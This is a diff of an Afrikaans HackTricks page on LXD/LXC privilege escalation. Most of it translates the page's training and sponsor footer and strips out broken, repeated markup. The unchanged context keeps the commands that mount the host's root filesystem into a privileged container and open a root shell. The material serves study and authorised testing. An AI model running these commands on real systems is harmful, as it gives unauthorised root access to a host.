@@ -66,7 +66,7 @@ As jy hierdie fout _**Fout: Geen stoorpoel gevind nie. Skep asseblief 'n nuwe st
 Voer **`lxd init`** uit en **herhaal** die vorige stel opdragte
 {% endhint %}
 
-Uiteindelik kan jy die houer uitvoer en root verkry:
+Laastens kan jy die houer uitvoer en root verkry:
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
@@ -93,118 +93,18 @@ lxc init myimage mycontainer -c security.privileged=true
 
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
-
-<div data-gb-custom-block data-tag="hint" data-style='success'>
-
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+```
+{% hint style="success" %}
+Leer & oefen AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Ondersteun HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
-
-</details>
-
-</div>
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
-
-</div>
-
-</details>
-
-</div>
-```
-
+{% endhint %}
